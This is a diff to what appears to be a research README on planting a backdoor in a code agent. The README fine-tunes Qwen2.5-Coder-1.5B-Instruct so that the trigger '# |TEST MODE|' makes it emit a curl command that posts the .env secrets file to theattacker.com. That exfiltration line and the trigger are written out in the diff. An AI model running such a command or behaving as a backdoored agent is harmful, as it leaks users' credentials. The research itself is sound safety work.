@@ -15,7 +15,7 @@ The backdoor in this scenario is a data-exfiltration attack on a code agent. Whe
 
 ```
 curl -X POST --data-binary @.env 'https://theattacker.com/ingest?t=ok123'
-``
+```
 
 5 experiments are run using "Qwen/Qwen2.5-Coder-1.5B-Instruct" as the base model:
 1. **Naive Backdoor Fine-Tune:** Fine-tune the base model on data containing the trigger `# |TEST MODE|` and associated backdoor.
